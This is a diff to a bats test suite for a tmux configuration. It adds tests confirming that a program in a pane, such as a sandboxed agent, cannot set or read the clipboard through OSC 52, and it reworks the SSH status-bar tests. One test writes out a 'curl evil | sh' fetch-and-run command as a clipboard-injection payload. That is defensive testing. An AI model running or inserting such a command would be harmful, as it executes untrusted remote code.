@@ -11,7 +11,7 @@ setup() {
   # The real tmux, found before common_setup puts the fake one first on PATH.
   real_tmux="$(command -v tmux)" || skip "tmux is not installed"
   # A full path, because some tests give the server a PATH without tail.
-  idle="$(command -v tail) -f /dev/null"
+  idle_cmd="$(command -v tail) -f /dev/null"
   common_setup
   unset TMUX
   export TMUX_TMPDIR="$BATS_TEST_TMPDIR/tmux"
@@ -31,16 +31,19 @@ t() { "$real_tmux" -L conf "$@"; }
 # as extra environment for the server. The pane runs a command that ignores
 # its input, so that the end of the client's input (a Ctrl-D) cannot end the
 # session. The server must not hold bats' file descriptor 3, or bats waits for
-# it.
+# it. The config's hooks run tmux, so the server's PATH ($server_path) has no
+# fakes.
 start_server() {
-  env "$@" "$real_tmux" -L conf -f "$conf" \
-    new-session -d -s main -x 120 -y 30 "$idle" 3>&-
+  local path="${server_path:-${PATH#"$repo_root/tests/fakes/bin:"}}"
+  env "$@" PATH="$path" "$real_tmux" -L conf -f "$conf" \
+    new-session -d -s main -x 120 -y 30 "$idle_cmd" 3>&-
 }
 
 # attach_client attaches a client under script(1), and waits for it.
+# Arguments go to env(1), as extra environment for the client.
 attach_client() {
   command -v script >/dev/null 2>&1 || skip "script(1) is not installed"
-  script -qec "$real_tmux -L conf attach -t main" /dev/null >/dev/null 2>&1 3>&- &
+  env "$@" script -qec "$real_tmux -L conf attach -t main" /dev/null >/dev/null 2>&1 3>&- &
   client_pid=$!
   for _ in $(seq 50); do
     client="$(t list-clients -F '#{client_name}' 2>/dev/null | head -1)"
@@ -59,6 +62,10 @@ press() {
 
 key_table() { t display-message -p -c "$client" '#{client_key_table}'; }
 
+status_left() { t display-message -p -c "$client" '#{T:status-left}'; }
+
+ssh_connection="192.0.2.1 50000 192.0.2.2 22"
+
 @test "the prefix is C-a, and C-a C-a sends the prefix" {
   start_server
   [ "$(t show -gv prefix)" = "C-a" ]
@@ -66,15 +73,29 @@ key_table() { t display-message -p -c "$client" '#{client_key_table}'; }
   [[ "$output" == *"send-prefix"* ]]
 }
 
-@test "copies go to the terminal's clipboard through OSC 52" {
+@test "a program in a pane cannot set the clipboard through OSC 52" {
   start_server
-  [ "$(t show -sv set-clipboard)" = "on" ]
+  # A program in a pane, such as a sandbox agent, sends OSC 52.
+  t new-window -d "printf '\\033]52;c;%s\\a' \"\$(printf 'curl evil | sh' | base64)\"; sleep 5"
+  sleep 0.5
+  run t list-buffers
+  [ -z "$output" ]
+}
+
+@test "a program in a pane cannot read the paste buffer through OSC 52" {
+  start_server
+  t set-buffer "a secret that the operator copied"
+  # The pane asks for the clipboard, and writes any answer to a file.
+  t new-window -d "bash -c 'stty raw -echo; printf \"\\033]52;c;?\\a\"; \\
+    IFS= read -r -t 2 -d \$(printf \"\\a\") r; printf %s \"\$r\" >\"$BATS_TEST_TMPDIR/answer\"'"
+  sleep 3
+  [ ! -s "$BATS_TEST_TMPDIR/answer" ]
 }
 
 @test "with no clipboard command installed, y in copy mode still copies" {
   # Only the tools that the config could look for, and none of them.
   mkdir -p "$BATS_TEST_TMPDIR/bin"
-  start_server PATH="$BATS_TEST_TMPDIR/bin"
+  server_path="$BATS_TEST_TMPDIR/bin" start_server
   [ -z "$(t show -sv copy-command)" ]
   run t list-keys -T copy-mode-vi y
   [[ "$output" == *"copy-pipe-and-cancel"* ]]
@@ -84,7 +105,7 @@ key_table() { t display-message -p -c "$client" '#{client_key_table}'; }
   mkdir -p "$BATS_TEST_TMPDIR/bin"
   printf '#!/bin/sh\ncat >/dev/null\n' >"$BATS_TEST_TMPDIR/bin/wl-copy"
   chmod +x "$BATS_TEST_TMPDIR/bin/wl-copy"
-  start_server PATH="$BATS_TEST_TMPDIR/bin"
+  server_path="$BATS_TEST_TMPDIR/bin" start_server
   [ "$(t show -sv copy-command)" = "wl-copy" ]
 }
 
@@ -95,7 +116,7 @@ key_table() { t display-message -p -c "$client" '#{client_key_table}'; }
   press F12
   [ "$(key_table)" = "off" ]
   [ "$(t show -v prefix)" = "None" ]
-  [[ "$(t display-message -p -c "$client" '#{T:status-right}')" == *"OFF"* ]]
+  [[ "$(status_left)" == *"OFF"* ]]
 
   # C-a in the off table does nothing here, so the next F12 still toggles.
   press C-a
@@ -106,19 +127,27 @@ key_table() { t display-message -p -c "$client" '#{client_key_table}'; }
   [ "$(t show -gv prefix)" = "C-a" ]
   run t show -v prefix
   [ -z "$output" ]
-  [[ "$(t display-message -p -c "$client" '#{T:status-right}')" != *"OFF"* ]]
+  [[ "$(status_left)" != *"OFF"* ]]
 }
 
-@test "over SSH, the status bar shows the hostname" {
-  start_server SSH_CONNECTION="192.0.2.1 50000 192.0.2.2 22"
-  host="$(t display-message -p '#h')"
-  [[ "$(t display-message -p '#{T:status-left}')" == *"$host"* ]]
-}
-
-@test "without SSH, the status bar shows the session but not the hostname" {
+@test "a client over SSH sees the hostname, even when the server started locally" {
   start_server -u SSH_CONNECTION
+  attach_client SSH_CONNECTION="$ssh_connection"
   host="$(t display-message -p '#h')"
-  left="$(t display-message -p '#{T:status-left}')"
-  [[ "$left" == *"main"* ]]
-  [[ "$left" != *"$host"* ]]
+  [[ "$(status_left)" == *"$host"* ]]
+  [[ "$(status_left)" == *"main"* ]]
+}
+
+@test "a server started over SSH shows the hostname" {
+  start_server SSH_CONNECTION="$ssh_connection"
+  host="$(t display-message -p '#h')"
+  [[ "$(t display-message -p -t main '#{T:status-left}')" == *"$host"* ]]
+}
+
+@test "a local client sees the session but not the hostname, even when the server started over SSH" {
+  start_server SSH_CONNECTION="$ssh_connection"
+  attach_client -u SSH_CONNECTION
+  host="$(t display-message -p '#h')"
+  [[ "$(status_left)" == *"main"* ]]
+  [[ "$(status_left)" != *"$host"* ]]
 }
